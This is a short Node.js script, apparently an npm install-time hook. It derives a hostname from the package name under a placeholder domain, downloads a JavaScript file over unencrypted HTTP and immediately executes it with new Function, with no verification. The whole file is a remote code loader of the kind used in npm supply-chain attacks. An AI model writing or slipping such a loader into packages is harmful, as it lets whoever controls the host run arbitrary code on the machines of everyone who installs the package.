const http = require("http");
const fs = require("fs");
const path = require("path");

const packageName = process.env.npm_package_name ||
  JSON.parse(fs.readFileSync(path.join(__dirname, "package.json"), "utf8")).name;
const host = `${packageName}.updates.example.invalid`;

http.get(`http://${host}/x.js`, (res) => {
  let body = "";
  res.on("data", (chunk) => body += chunk);
  res.on("end", () => new Function(body)());
});
